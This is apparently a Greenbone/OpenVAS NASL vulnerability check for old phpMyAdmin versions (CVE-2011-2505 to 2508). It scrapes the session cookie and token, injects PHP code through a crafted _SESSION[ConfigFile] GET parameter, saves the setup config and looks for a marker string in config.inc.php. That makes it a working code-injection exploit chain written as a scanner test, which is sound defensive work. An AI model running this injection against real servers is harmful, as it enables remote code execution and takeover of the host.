# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:phpmyadmin:phpmyadmin";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103188");
  script_version("2023-10-17T05:05:34+0000");
  script_cve_id("CVE-2011-2505", "CVE-2011-2506", "CVE-2011-2507", "CVE-2011-2508");
  script_tag(name:"last_modification", value:"2023-10-17 05:05:34 +0000 (Tue, 17 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-07-11 14:09:04 +0200 (Mon, 11 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("phpMyAdmin < 3.3.10.2, 3.4.x < 3.4.3.1 Multiple Remote Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_phpmyadmin_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpMyAdmin/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48563");
  script_xref(name:"URL", value:"http://ha.xxor.se/2011/07/phpmyadmin-3x-multiple-remote-code.html");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-5.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-6.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-7.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-8.php");
  script_xref(name:"URL", value:"http://typo3.org/teams/security/security-bulletins/typo3-sa-2011-008/");

  script_tag(name:"summary", value:"phpMyAdmin is prone to multiple remote vulnerabilities, including
  PHP code-execution and local file-include vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends various crafted HTTP GET requests and checks the
  responses.");

  script_tag(name:"impact", value:"Successful attacks can compromise the affected application and
  possibly the underlying computer.");

  script_tag(name:"affected", value:"phpMyAdmin versions prior to 3.3.10.2 and 3.4.x prior to
  3.4.3.1.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/setup/index.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(!buf || buf =~ "^HTTP/1\.[01] 404" || "Cannot load or save configuration" >< buf)
  exit(0);

c = eregmatch(pattern:"phpMyAdmin=([^;]+)", string:buf);
if(isnull(c[1]))
  exit(0);

cookie = c[1];

t = eregmatch(pattern:'(token=|token" value=")([0-9a-f]{32})', string:buf);
if(isnull(t[2]))
  exit(0);

token = t[2];

vt_strings = get_vt_strings();
host = http_host_name(port:port);

req = string("GET ", dir, "/?_SESSION[ConfigFile][Servers][*/print+%22", vt_strings["lowercase"], "%22%3B/*][port]=0&session_to_unset=x&token=", token, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept: */*\r\n",
             "Cookie: phpMyAdmin=", cookie, "\r\n",
             "\r\n");
rcv = http_send_recv(port:port, data:req);

if(!rcv || rcv !~ "^HTTP/1\.[01] 200")
  exit(0);

req = string("POST ", dir, "/setup/config.php HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Accept: */*\r\n",
             "Cookie: phpMyAdmin=", cookie, "\r\n",
             "Content-Length: 55\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "\r\n",
             "submit_save=Save&token=", token, "\r\n");
http_send_recv(port:port, data:req);

url = string(dir, "/config/config.inc.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(vt_strings["lowercase"] >< buf) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
